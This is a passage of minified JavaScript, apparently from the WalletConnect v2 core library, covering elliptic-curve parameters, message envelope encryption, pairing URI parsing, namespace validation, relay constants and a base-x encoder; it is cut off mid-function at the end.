qre={p:BigInt("0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff"),n:BigInt("0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551"),h:BigInt(1),a:BigInt("0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc"),b:BigInt("0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b"),Gx:BigInt("0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"),Gy:BigInt("0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5")},zre={p:BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000ffffffff"),n:BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffc7634d81f4372ddf581a0db248b0a77aecec196accc52973"),h:BigInt(1),a:BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000fffffffc"),b:BigInt("0xb3312fa7e23ee7e4988e056be3f82d19181d9c6efe8141120314088f5013875ac656398d8a2ed19d2a85c8edd3ec2aef"),Gx:BigInt("0xaa87ca22be8b05378eb1c71ef320ad746e1d3b628ba79b9859f741e082542a385502f25dbf55296c3a545e3872760ab7"),Gy:BigInt("0x3617de4a96262c6f5d9e98bf9292dc29f8f41dbd289a147ce9da3113b5f0b8c00a60b1ce1d7e819d7a431d7c90ea0e5f")},Wre={p:BigInt("0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),n:BigInt("0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409"),h:BigInt(1),a:BigInt("0x1fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc"),b:BigInt("0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00"),Gx:BigInt("0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66"),Gy:BigInt("0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650")},YFe=j3(qre.p),JFe=j3(zre.p),QFe=j3(Wre.p),XFe=RN({...qre,Fp:YFe,lowS:!1},GC);RN({...zre,Fp:JFe,lowS:!1},aje),RN({...Wre,Fp:QFe,lowS:!1,allowedPrivateKeyLengths:[130,131,132]},oje);const eqe=XFe,Hre="base10",Zo="base16",lu="base64pad",Tf="base64url",H4="utf8",Vre=0,r0=1,V4=2,tqe=0,mW=1,F5=12,PO=32;function rqe(){const r=$N.utils.randomPrivateKey(),e=$N.getPublicKey(r);return{privateKey:$a(r,Zo),publicKey:$a(e,Zo)}}function ON(){const r=U3(PO);return $a(r,Zo)}function iqe(r,e){const t=$N.getSharedSecret(tl(r,Zo),tl(e,Zo)),i=fFe(YC,t,void 0,void 0,PO);return $a(i,Zo)}function y9(r){const e=YC(tl(r,Zo));return $a(e,Zo)}function ad(r){const e=YC(tl(r,H4));return $a(e,Zo)}function Kre(r){return tl(`${r}`,Hre)}function Tg(r){return Number($a(r,Hre))}function Gre(r){return r.replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"")}function Zre(r){const e=r.replace(/-/g,"+").replace(/_/g,"/"),t=(4-e.length%4)%4;return e+"=".repeat(t)}function nqe(r){const e=Kre(typeof r.type<"u"?r.type:Vre);if(Tg(e)===r0&&typeof r.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");const t=typeof r.senderPublicKey<"u"?tl(r.senderPublicKey,Zo):void 0,i=typeof r.iv<"u"?tl(r.iv,Zo):U3(F5),n=tl(r.symKey,Zo),s=Ire(n,i).encrypt(tl(r.message,H4)),o=Yre({type:e,sealed:s,iv:i,senderPublicKey:t});return r.encoding===Tf?Gre(o):o}function sqe(r){const e=tl(r.symKey,Zo),{sealed:t,iv:i}=Ty({encoded:r.encoded,encoding:r.encoding}),n=Ire(e,i).decrypt(t);if(n===null)throw new Error("Failed to decrypt");return $a(n,H4)}function oqe(r,e){const t=Kre(V4),i=U3(F5),n=tl(r,H4),s=Yre({type:t,sealed:n,iv:i});return e===Tf?Gre(s):s}function aqe(r,e){const{sealed:t}=Ty({encoded:r,encoding:e});return $a(t,H4)}function Yre(r){if(Tg(r.type)===V4)return $a(D5([r.type,r.sealed]),lu);if(Tg(r.type)===r0){if(typeof r.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");return $a(D5([r.type,r.senderPublicKey,r.iv,r.sealed]),lu)}return $a(D5([r.type,r.iv,r.sealed]),lu)}function Ty(r){const e=(r.encoding||lu)===Tf?Zre(r.encoded):r.encoded,t=tl(e,lu),i=t.slice(tqe,mW),n=mW;if(Tg(i)===r0){const c=n+PO,l=c+F5,u=t.slice(n,c),d=t.slice(c,l),h=t.slice(l);return{type:i,sealed:h,iv:d,senderPublicKey:u}}if(Tg(i)===V4){const c=t.slice(n),l=U3(F5);return{type:i,sealed:c,iv:l}}const s=n+F5,o=t.slice(n,s),a=t.slice(s);return{type:i,sealed:a,iv:o}}function cqe(r,e){const t=Ty({encoded:r,encoding:e?.encoding});return Jre({type:Tg(t.type),senderPublicKey:typeof t.senderPublicKey<"u"?$a(t.senderPublicKey,Zo):void 0,receiverPublicKey:e?.receiverPublicKey})}function Jre(r){const e=r?.type||Vre;if(e===r0){if(typeof r?.senderPublicKey>"u")throw new Error("missing sender public key");if(typeof r?.receiverPublicKey>"u")throw new Error("missing receiver public key")}return{type:e,senderPublicKey:r?.senderPublicKey,receiverPublicKey:r?.receiverPublicKey}}function wW(r){return r.type===r0&&typeof r.senderPublicKey=="string"&&typeof r.receiverPublicKey=="string"}function bW(r){return r.type===V4}function lqe(r){const e=Buffer.from(r.x,"base64"),t=Buffer.from(r.y,"base64");return D5([new Uint8Array([4]),e,t])}function uqe(r,e){const[t,i,n]=r.split("."),s=Buffer.from(Zre(n),"base64");if(s.length!==64)throw new Error("Invalid signature length");const o=s.slice(0,32),a=s.slice(32,64),c=`${t}.${i}`,l=YC(c),u=lqe(e);if(!eqe.verify(D5([o,a]),l,u))throw new Error("Invalid signature");return u0(r).payload}const dqe="irn";function X7(r){return r?.relay||{protocol:dqe}}function c5(r){const e=cR[r];if(typeof e>"u")throw new Error(`Relay Protocol not supported: ${r}`);return e}function hqe(r,e="-"){const t={},i="relay"+e;return Object.keys(r).forEach(n=>{if(n.startsWith(i)){const s=n.replace(i,""),o=r[n];t[s]=o}}),t}function vW(r){if(!r.includes("wc:")){const l=cre(r);l!=null&&l.includes("wc:")&&(r=l)}r=r.includes("wc://")?r.replace("wc://",""):r,r=r.includes("wc:")?r.replace("wc:",""):r;const e=r.indexOf(":"),t=r.indexOf("?")!==-1?r.indexOf("?"):void 0,i=r.substring(0,e),n=r.substring(e+1,t).split("@"),s=typeof t<"u"?r.substring(t):"",o=new URLSearchParams(s),a={};o.forEach((l,u)=>{a[u]=l});const c=typeof a.methods=="string"?a.methods.split(","):void 0;return{protocol:i,topic:fqe(n[0]),version:parseInt(n[1],10),symKey:a.symKey,relay:hqe(a),methods:c,expiryTimestamp:a.expiryTimestamp?parseInt(a.expiryTimestamp,10):void 0}}function fqe(r){return r.startsWith("//")?r.substring(2):r}function pqe(r,e="-"){const t="relay",i={};return Object.keys(r).forEach(n=>{const s=n,o=t+e+s;r[s]&&(i[o]=r[s])}),i}function yW(r){const e=new URLSearchParams,t=pqe(r.relay);Object.keys(t).sort().forEach(n=>{e.set(n,t[n])}),e.set("symKey",r.symKey),r.expiryTimestamp&&e.set("expiryTimestamp",r.expiryTimestamp.toString()),r.methods&&e.set("methods",r.methods.join(","));const i=e.toString();return`${r.protocol}:${r.topic}@${r.version}?${i}`}function m8(r,e,t){return`${r}?wc_ev=${t}&topic=${e}`}var gqe=Object.defineProperty,mqe=Object.defineProperties,wqe=Object.getOwnPropertyDescriptors,xW=Object.getOwnPropertySymbols,bqe=Object.prototype.hasOwnProperty,vqe=Object.prototype.propertyIsEnumerable,CW=(r,e,t)=>e in r?gqe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,yqe=(r,e)=>{for(var t in e||(e={}))bqe.call(e,t)&&CW(r,t,e[t]);if(xW)for(var t of xW(e))vqe.call(e,t)&&CW(r,t,e[t]);return r},xqe=(r,e)=>mqe(r,wqe(e));function F3(r){const e=[];return r.forEach(t=>{const[i,n]=t.split(":");e.push(`${i}:${n}`)}),e}function Cqe(r){const e=[];return Object.values(r).forEach(t=>{e.push(...F3(t.accounts))}),e}function Eqe(r,e){const t=[];return Object.values(r).forEach(i=>{F3(i.accounts).includes(e)&&t.push(...i.methods)}),t}function _qe(r,e){const t=[];return Object.values(r).forEach(i=>{F3(i.accounts).includes(e)&&t.push(...i.events)}),t}function eE(r){return r.includes(":")}function Gm(r){return eE(r)?r.split(":")[0]:r}function EW(r){var e,t,i;const n={};if(!Ed(r))return n;for(const[s,o]of Object.entries(r)){const a=eE(s)?[s]:o.chains,c=o.methods||[],l=o.events||[],u=Gm(s);n[u]=xqe(yqe({},n[u]),{chains:Cd(a,(e=n[u])==null?void 0:e.chains),methods:Cd(c,(t=n[u])==null?void 0:t.methods),events:Cd(l,(i=n[u])==null?void 0:i.events)})}return n}function Sqe(r){const e={};return r?.forEach(t=>{var i;const[n,s]=t.split(":");e[n]||(e[n]={accounts:[],chains:[],events:[],methods:[]}),e[n].accounts.push(t),(i=e[n].chains)==null||i.push(`${n}:${s}`)}),e}function _W(r,e){e=e.map(i=>i.replace("did:pkh:",""));const t=Sqe(e);for(const[i,n]of Object.entries(t))n.methods?n.methods=Cd(n.methods,r):n.methods=r,n.events=["chainChanged","accountsChanged"];return t}function Aqe(r,e){var t,i,n,s,o,a;const c=EW(r),l=EW(e),u={},d=Object.keys(c).concat(Object.keys(l));for(const h of d)u[h]={chains:Cd((t=c[h])==null?void 0:t.chains,(i=l[h])==null?void 0:i.chains),methods:Cd((n=c[h])==null?void 0:n.methods,(s=l[h])==null?void 0:s.methods),events:Cd((o=c[h])==null?void 0:o.events,(a=l[h])==null?void 0:a.events)};return u}const Iqe={INVALID_METHOD:{message:"Invalid method.",code:1001},INVALID_EVENT:{message:"Invalid event.",code:1002},INVALID_UPDATE_REQUEST:{message:"Invalid update request.",code:1003},INVALID_EXTEND_REQUEST:{message:"Invalid extend request.",code:1004},INVALID_SESSION_SETTLE_REQUEST:{message:"Invalid session settle request.",code:1005},UNAUTHORIZED_METHOD:{message:"Unauthorized method.",code:3001},UNAUTHORIZED_EVENT:{message:"Unauthorized event.",code:3002},UNAUTHORIZED_UPDATE_REQUEST:{message:"Unauthorized update request.",code:3003},UNAUTHORIZED_EXTEND_REQUEST:{message:"Unauthorized extend request.",code:3004},USER_REJECTED:{message:"User rejected.",code:5e3},USER_REJECTED_CHAINS:{message:"User rejected chains.",code:5001},USER_REJECTED_METHODS:{message:"User rejected methods.",code:5002},USER_REJECTED_EVENTS:{message:"User rejected events.",code:5003},UNSUPPORTED_CHAINS:{message:"Unsupported chains.",code:5100},UNSUPPORTED_METHODS:{message:"Unsupported methods.",code:5101},UNSUPPORTED_EVENTS:{message:"Unsupported events.",code:5102},UNSUPPORTED_ACCOUNTS:{message:"Unsupported accounts.",code:5103},UNSUPPORTED_NAMESPACE_KEY:{message:"Unsupported namespace key.",code:5104},USER_DISCONNECTED:{message:"User disconnected.",code:6e3},SESSION_SETTLEMENT_FAILED:{message:"Session settlement failed.",code:7e3},WC_METHOD_UNSUPPORTED:{message:"Unsupported wc_ method.",code:10001}},Tqe={NOT_INITIALIZED:{message:"Not initialized.",code:1},NO_MATCHING_KEY:{message:"No matching key.",code:2},RESTORE_WILL_OVERRIDE:{message:"Restore will override.",code:3},RESUBSCRIBED:{message:"Resubscribed.",code:4},MISSING_OR_INVALID:{message:"Missing or invalid.",code:5},EXPIRED:{message:"Expired.",code:6},UNKNOWN_TYPE:{message:"Unknown type.",code:7},MISMATCHED_TOPIC:{message:"Mismatched topic.",code:8},NON_CONFORMING_NAMESPACES:{message:"Non conforming namespaces.",code:9}};function ot(r,e){const{message:t,code:i}=Tqe[r];return{message:e?`${t} ${e}`:t,code:i}}function gn(r,e){const{message:t,code:i}=Iqe[r];return{message:e?`${t} ${e}`:t,code:i}}function il(r,e){return!!Array.isArray(r)}function Ed(r){return Object.getPrototypeOf(r)===Object.prototype&&Object.keys(r).length}function co(r){return typeof r>"u"}function ls(r,e){return e&&co(r)?!0:typeof r=="string"&&!!r.trim().length}function $O(r,e){return e&&co(r)?!0:typeof r=="number"&&!isNaN(r)}function kqe(r,e){const{requiredNamespaces:t}=e,i=Object.keys(r.namespaces),n=Object.keys(t);let s=!0;return S1(n,i)?(i.forEach(o=>{const{accounts:a,methods:c,events:l}=r.namespaces[o],u=F3(a),d=t[o];(!S1(ire(o,d),u)||!S1(d.methods,c)||!S1(d.events,l))&&(s=!1)}),s):!1}function ex(r){return ls(r,!1)&&r.includes(":")?r.split(":").length===2:!1}function Nqe(r){if(ls(r,!1)&&r.includes(":")){const e=r.split(":");if(e.length===3){const t=e[0]+":"+e[1];return!!e[2]&&ex(t)}}return!1}function Pqe(r){function e(t){try{return typeof new URL(t)<"u"}catch{return!1}}try{if(ls(r,!1)){if(e(r))return!0;const t=cre(r);return e(t)}}catch{}return!1}function $qe(r){var e;return(e=r?.proposer)==null?void 0:e.publicKey}function Rqe(r){return r?.topic}function Oqe(r,e){let t=null;return ls(r?.publicKey,!1)||(t=ot("MISSING_OR_INVALID",`${e} controller public key should be a string`)),t}function SW(r){let e=!0;return il(r)?r.length&&(e=r.every(t=>ls(t,!1))):e=!1,e}function Bqe(r,e,t){let i=null;return il(e)&&e.length?e.forEach(n=>{i||ex(n)||(i=gn("UNSUPPORTED_CHAINS",`${t}, chain ${n} should be a string and conform to "namespace:chainId" format`))}):ex(r)||(i=gn("UNSUPPORTED_CHAINS",`${t}, chains must be defined as "namespace:chainId" e.g. "eip155:1": {...} in the namespace key OR as an array of CAIP-2 chainIds e.g. eip155: { chains: ["eip155:1", "eip155:5"] }`)),i}function Mqe(r,e,t){let i=null;return Object.entries(r).forEach(([n,s])=>{if(i)return;const o=Bqe(n,ire(n,s),`${e} ${t}`);o&&(i=o)}),i}function Dqe(r,e){let t=null;return il(r)?r.forEach(i=>{t||Nqe(i)||(t=gn("UNSUPPORTED_ACCOUNTS",`${e}, account ${i} should be a string and conform to "namespace:chainId:address" format`))}):t=gn("UNSUPPORTED_ACCOUNTS",`${e}, accounts should be an array of strings conforming to "namespace:chainId:address" format`),t}function Lqe(r,e){let t=null;return Object.values(r).forEach(i=>{if(t)return;const n=Dqe(i?.accounts,`${e} namespace`);n&&(t=n)}),t}function Uqe(r,e){let t=null;return SW(r?.methods)?SW(r?.events)||(t=gn("UNSUPPORTED_EVENTS",`${e}, events should be an array of strings or empty array for no events`)):t=gn("UNSUPPORTED_METHODS",`${e}, methods should be an array of strings or empty array for no methods`),t}function Qre(r,e){let t=null;return Object.values(r).forEach(i=>{if(t)return;const n=Uqe(i,`${e}, namespace`);n&&(t=n)}),t}function jqe(r,e,t){let i=null;if(r&&Ed(r)){const n=Qre(r,e);n&&(i=n);const s=Mqe(r,e,t);s&&(i=s)}else i=ot("MISSING_OR_INVALID",`${e}, ${t} should be an object with data`);return i}function uI(r,e){let t=null;if(r&&Ed(r)){const i=Qre(r,e);i&&(t=i);const n=Lqe(r,e);n&&(t=n)}else t=ot("MISSING_OR_INVALID",`${e}, namespaces should be an object with data`);return t}function Xre(r){return ls(r.protocol,!0)}function Fqe(r,e){let t=!1;return r?r&&il(r)&&r.length&&r.forEach(i=>{t=Xre(i)}):t=!0,t}function qqe(r){return typeof r=="number"}function wa(r){return typeof r<"u"&&typeof r!==null}function zqe(r){return!(!r||typeof r!="object"||!r.code||!$O(r.code,!1)||!r.message||!ls(r.message,!1))}function Wqe(r){return!(co(r)||!ls(r.method,!1))}function Hqe(r){return!(co(r)||co(r.result)&&co(r.error)||!$O(r.id,!1)||!ls(r.jsonrpc,!1))}function Vqe(r){return!(co(r)||!ls(r.name,!1))}function AW(r,e){return!(!ex(e)||!Cqe(r).includes(e))}function Kqe(r,e,t){return ls(t,!1)?Eqe(r,e).includes(t):!1}function Gqe(r,e,t){return ls(t,!1)?_qe(r,e).includes(t):!1}function IW(r,e,t){let i=null;const n=Zqe(r),s=Yqe(e),o=Object.keys(n),a=Object.keys(s),c=TW(Object.keys(r)),l=TW(Object.keys(e)),u=c.filter(d=>!l.includes(d));return u.length&&(i=ot("NON_CONFORMING_NAMESPACES",`${t} namespaces keys don't satisfy requiredNamespaces.
      Required: ${u.toString()}
      Received: ${Object.keys(e).toString()}`)),S1(o,a)||(i=ot("NON_CONFORMING_NAMESPACES",`${t} namespaces chains don't satisfy required namespaces.
      Required: ${o.toString()}
      Approved: ${a.toString()}`)),Object.keys(e).forEach(d=>{if(!d.includes(":")||i)return;const h=F3(e[d].accounts);h.includes(d)||(i=ot("NON_CONFORMING_NAMESPACES",`${t} namespaces accounts don't satisfy namespace accounts for ${d}
        Required: ${d}
        Approved: ${h.toString()}`))}),o.forEach(d=>{i||(S1(n[d].methods,s[d].methods)?S1(n[d].events,s[d].events)||(i=ot("NON_CONFORMING_NAMESPACES",`${t} namespaces events don't satisfy namespace events for ${d}`)):i=ot("NON_CONFORMING_NAMESPACES",`${t} namespaces methods don't satisfy namespace methods for ${d}`))}),i}function Zqe(r){const e={};return Object.keys(r).forEach(t=>{var i;t.includes(":")?e[t]=r[t]:(i=r[t].chains)==null||i.forEach(n=>{e[n]={methods:r[t].methods,events:r[t].events}})}),e}function TW(r){return[...new Set(r.map(e=>e.includes(":")?e.split(":")[0]:e))]}function Yqe(r){const e={};return Object.keys(r).forEach(t=>{t.includes(":")?e[t]=r[t]:F3(r[t].accounts)?.forEach(n=>{e[n]={accounts:r[t].accounts.filter(s=>s.includes(`${n}:`)),methods:r[t].methods,events:r[t].events}})}),e}function Jqe(r,e){return $O(r,!1)&&r<=e.max&&r>=e.min}function kW(){const r=z4();return new Promise(e=>{switch(r){case uc.browser:e(Qqe());break;case uc.reactNative:e(Xqe());break;case uc.node:e(eze());break;default:e(!0)}})}function Qqe(){return L3()&&navigator?.onLine}async function Xqe(){return Bp()&&typeof global<"u"&&global!=null&&global.NetInfo?(await(global==null?void 0:global.NetInfo.fetch()))?.isConnected:!0}function eze(){return!0}function tze(r){switch(z4()){case uc.browser:rze(r);break;case uc.reactNative:ize(r);break}}function rze(r){!Bp()&&L3()&&(window.addEventListener("online",()=>r(!0)),window.addEventListener("offline",()=>r(!1)))}function ize(r){Bp()&&typeof global<"u"&&global!=null&&global.NetInfo&&global?.NetInfo.addEventListener(e=>r(e?.isConnected))}function nze(){var r;return L3()&&vn.getDocument()?((r=vn.getDocument())==null?void 0:r.visibilityState)==="visible":!0}const dI={};class Rb{static get(e){return dI[e]}static set(e,t){dI[e]=t}static delete(e){delete dI[e]}}function sze(r){const e=Np.decode(r);if(e.length<33)throw new Error("Too short to contain a public key");return e.slice(1,33)}function oze({publicKey:r,signature:e,payload:t}){var i;const n=BN(t.method),s=128|parseInt(((i=t.version)==null?void 0:i.toString())||"4"),o=lze(t.address),a=t.era==="00"?new Uint8Array([0]):BN(t.era);if(a.length!==1&&a.length!==2)throw new Error("Invalid era length");const c=parseInt(t.nonce,16),l=new Uint8Array([c&255,c>>8&255]),u=BigInt(`0x${cze(t.tip)}`),d=dze(u),h=new Uint8Array([0,...r,o,...e,...a,...l,...d,...n]),f=uze(h.length+1);return new Uint8Array([...f,s,...h])}function aze(r){const e=BN(r),t=JLe.blake2b(e,void 0,32);return"0x"+Buffer.from(t).toString("hex")}function BN(r){return new Uint8Array(r.replace(/^0x/,"").match(/.{1,2}/g).map(e=>parseInt(e,16)))}function cze(r){return r.startsWith("0x")?r.slice(2):r}function lze(r){const e=Np.decode(r)[0];return e===42?0:e===60?2:1}function uze(r){if(r<64)return new Uint8Array([r<<2]);if(r<16384){const e=r<<2|1;return new Uint8Array([e&255,e>>8&255])}else if(r<1<<30){const e=r<<2|2;return new Uint8Array([e&255,e>>8&255,e>>16&255,e>>24&255])}else throw new Error("Compact encoding > 2^30 not supported")}function dze(r){if(r<BigInt(1)<<BigInt(6))return new Uint8Array([Number(r<<BigInt(2))]);if(r<BigInt(1)<<BigInt(14)){const e=r<<BigInt(2)|BigInt(1);return new Uint8Array([Number(e&BigInt(255)),Number(e>>BigInt(8)&BigInt(255))])}else if(r<BigInt(1)<<BigInt(30)){const e=r<<BigInt(2)|BigInt(2);return new Uint8Array([Number(e&BigInt(255)),Number(e>>BigInt(8)&BigInt(255)),Number(e>>BigInt(16)&BigInt(255)),Number(e>>BigInt(24)&BigInt(255))])}else throw new Error("BigInt compact encoding not supported > 2^30")}function hze(r){const e=Uint8Array.from(Buffer.from(r.signature,"hex")),t=sze(r.transaction.address),i=oze({publicKey:t,signature:e,payload:r.transaction}),n=Buffer.from(i).toString("hex");return aze(n)}var fze=Object.defineProperty,pze=(r,e,t)=>e in r?fze(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,NW=(r,e,t)=>pze(r,typeof e!="symbol"?e+"":e,t);let gze=class extends As{constructor(e){super(),this.opts=e,NW(this,"protocol","wc"),NW(this,"version",2)}};var mze=Object.defineProperty,wze=(r,e,t)=>e in r?mze(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,bze=(r,e,t)=>wze(r,e+"",t);let vze=class extends As{constructor(e,t){super(),this.core=e,this.logger=t,bze(this,"records",new Map)}},yze=class{constructor(e,t){this.logger=e,this.core=t}},xze=class extends As{constructor(e,t){super(),this.relayer=e,this.logger=t}},Cze=class extends As{constructor(e){super()}},Eze=class{constructor(e,t,i,n){this.core=e,this.logger=t,this.name=i}},_ze=class extends As{constructor(e,t){super(),this.relayer=e,this.logger=t}},Sze=class extends As{constructor(e,t){super(),this.core=e,this.logger=t}},Aze=class{constructor(e,t,i){this.core=e,this.logger=t,this.store=i}},Ize=class{constructor(e,t){this.projectId=e,this.logger=t}},Tze=class{constructor(e,t,i){this.core=e,this.logger=t,this.telemetryEnabled=i}};var kze=Object.defineProperty,Nze=(r,e,t)=>e in r?kze(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,PW=(r,e,t)=>Nze(r,typeof e!="symbol"?e+"":e,t);let Pze=class{constructor(e){this.opts=e,PW(this,"protocol","wc"),PW(this,"version",2)}},$ze=class{constructor(e){this.client=e}};var Rze={};const eie="wc",tie=2,MN="core",Hd=`${eie}@2:${MN}:`,Oze={logger:"error"},Bze={database:":memory:"},Mze="crypto",$W="client_ed25519_seed",Dze=fe.ONE_DAY,Lze="keychain",Uze="0.3",jze="messages",Fze="0.3",RW=fe.SIX_HOURS,qze="publisher",rie="irn",zze="error",iie="wss://relay.walletconnect.org",Wze="relayer",Fs={message:"relayer_message",message_ack:"relayer_message_ack",connect:"relayer_connect",disconnect:"relayer_disconnect",error:"relayer_error",connection_stalled:"relayer_connection_stalled",transport_closed:"relayer_transport_closed",publish:"relayer_publish"},Hze="_subscription",Lc={payload:"payload",connect:"connect",disconnect:"disconnect",error:"error"},Vze=.1,DN="2.21.5",fn={link_mode:"link_mode",relay:"relay"},x9={inbound:"inbound",outbound:"outbound"},Kze="0.3",Gze="WALLETCONNECT_CLIENT_ID",OW="WALLETCONNECT_LINK_MODE_APPS",Xa={created:"subscription_created",deleted:"subscription_deleted",expired:"subscription_expired",disabled:"subscription_disabled",sync:"subscription_sync",resubscribed:"subscription_resubscribed"},Zze="subscription",Yze="0.3",Jze="pairing",Qze="0.3",Ob={wc_pairingDelete:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1e3},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1001}},wc_pairingPing:{req:{ttl:fe.THIRTY_SECONDS,prompt:!1,tag:1002},res:{ttl:fe.THIRTY_SECONDS,prompt:!1,tag:1003}},unregistered_method:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:0},res:{ttl:fe.ONE_DAY,prompt:!1,tag:0}}},l1={create:"pairing_create",expire:"pairing_expire",delete:"pairing_delete",ping:"pairing_ping"},zl={created:"history_created",updated:"history_updated",deleted:"history_deleted",sync:"history_sync"},Xze="history",eWe="0.3",tWe="expirer",Gc={created:"expirer_created",deleted:"expirer_deleted",expired:"expirer_expired",sync:"expirer_sync"},rWe="0.3",iWe="verify-api",nWe="https://verify.walletconnect.com",nie="https://verify.walletconnect.org",q5=nie,sWe=`${q5}/v3`,oWe=[nWe,nie],aWe="echo",cWe="https://echo.walletconnect.com",td={pairing_started:"pairing_started",pairing_uri_validation_success:"pairing_uri_validation_success",pairing_uri_not_expired:"pairing_uri_not_expired",store_new_pairing:"store_new_pairing",subscribing_pairing_topic:"subscribing_pairing_topic",subscribe_pairing_topic_success:"subscribe_pairing_topic_success",existing_pairing:"existing_pairing",pairing_not_expired:"pairing_not_expired",emit_inactive_pairing:"emit_inactive_pairing",emit_session_proposal:"emit_session_proposal",subscribing_to_pairing_topic:"subscribing_to_pairing_topic"},Rh={no_wss_connection:"no_wss_connection",no_internet_connection:"no_internet_connection",malformed_pairing_uri:"malformed_pairing_uri",active_pairing_already_exists:"active_pairing_already_exists",subscribe_pairing_topic_failure:"subscribe_pairing_topic_failure",pairing_expired:"pairing_expired",proposal_expired:"proposal_expired",proposal_listener_not_found:"proposal_listener_not_found"},Wl={session_approve_started:"session_approve_started",proposal_not_expired:"proposal_not_expired",session_namespaces_validation_success:"session_namespaces_validation_success",create_session_topic:"create_session_topic",subscribing_session_topic:"subscribing_session_topic",subscribe_session_topic_success:"subscribe_session_topic_success",publishing_session_approve:"publishing_session_approve",session_approve_publish_success:"session_approve_publish_success",store_session:"store_session",publishing_session_settle:"publishing_session_settle",session_settle_publish_success:"session_settle_publish_success"},Kp={no_internet_connection:"no_internet_connection",no_wss_connection:"no_wss_connection",proposal_expired:"proposal_expired",subscribe_session_topic_failure:"subscribe_session_topic_failure",session_approve_publish_failure:"session_approve_publish_failure",session_settle_publish_failure:"session_settle_publish_failure",session_approve_namespace_validation_failure:"session_approve_namespace_validation_failure",proposal_not_found:"proposal_not_found"},Gp={authenticated_session_approve_started:"authenticated_session_approve_started",create_authenticated_session_topic:"create_authenticated_session_topic",cacaos_verified:"cacaos_verified",store_authenticated_session:"store_authenticated_session",subscribing_authenticated_session_topic:"subscribing_authenticated_session_topic",subscribe_authenticated_session_topic_success:"subscribe_authenticated_session_topic_success",publishing_authenticated_session_approve:"publishing_authenticated_session_approve"},Bb={no_internet_connection:"no_internet_connection",invalid_cacao:"invalid_cacao",subscribe_authenticated_session_topic_failure:"subscribe_authenticated_session_topic_failure",authenticated_session_approve_publish_failure:"authenticated_session_approve_publish_failure",authenticated_session_pending_request_not_found:"authenticated_session_pending_request_not_found"},lWe=.1,uWe="event-client",dWe=86400,hWe="https://pulse.walletconnect.org/batch";function fWe(r,e){if(r.length>=255)throw new TypeError("Alphabet too long");for(var t=new Uint8Array(256),i=0;i<t.length;i++)t[i]=255;for(var n=0;n<r.length;n++){var s=r.charAt(n),o=s.charCodeAt(0);if(t[o]!==255)throw new TypeError(s+" is ambiguous");t[o]=n}var a=r.length,c=r.charAt(0),l=Math.log(a)/Math.log(256),u=Math.log(256)/Math.log(a);function d(p){if(p instanceof Uint8Array||(ArrayBuffer.isView(p)?p=new Uint8Array(p.buffer,p.byteOffset,p.byteLength):Array.isArray(p)&&(p=Uint8Array.from(p))),!(p instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(p.length===0)return"";for(var g=0,w=0,m=0,x=p.length;m!==x&&p[m]===0;)m++,g++;for(var S=(x-m)*u+1>>>0,T=new Uint8Array(S);m!==x;){for(var k=p[m],I=0,E=S-1;(k!==0||I<w)&&E!==-1;E--,I++)k+=256*T[E]>>>0,T[E]=k%a>>>0,k=k/a>>>0;if(k!==0)throw new Error("Non-zero carry");w=I,m++}for(var C=S-w;C!==S&&T[C]===0;)C++;for(var N=c.repeat(g);C<S;++C)N+=r.charAt(T[C]);return N}function h(p){if(typeof p!="string")throw new TypeError("Expected String");if(p.length===0)return new Uint8Array;var g=0;if(p[g]!==" "){for(var w=0,m=0;p[g]===c;)w++,g++;for(var x=(p.length-g)*l+1>>>0,S=new Uint8Array(x);p[g];){var T=t[p.charCodeAt(g)];if(T===255)return;for(var k=0,I=x-1;(T!==0||k<m)&&I!==-1;I--,k++)T+=a*S[I]>>>0,S[I]=T%256>>>0,T=T/256>>>0;if(T!==0)throw new Error("Non-zero carry");m=k,g++}if(p[g]!==" "){for(var E=x-m;E!==x&&S[E]===0;)E++;for(var C=new Uint8Array(w+(x-E)),N=w;E!==x;)C[N++]=S[E++];return C}}}function f(p){var g=h(p);if(g)return g;throw new Error(`Non-${e} character`)}return{encode:d,decodeUnsafe:h,decode:f}}var pWe=fWe,gWe=pWe;const sie=r=>{if(r instanceof Uint8Array&&r.constructor.name==="Uint8Array")return r;if(r instanceof ArrayBuffer)return new Uint8Array(r);if(ArrayBuffer.isView(r))return new Uint8Array(r.buffer,r.byteOffset,r.byteLength);throw new Error("Unknown type, must be binary type")},mWe=r=>new TextEncoder().encode(r),wWe=r=>new TextDecoder().decode(r);let bWe=class{constructor(e,t,i){this.name=e,this.prefix=t,this.baseEncode=i}encode(e){if(e 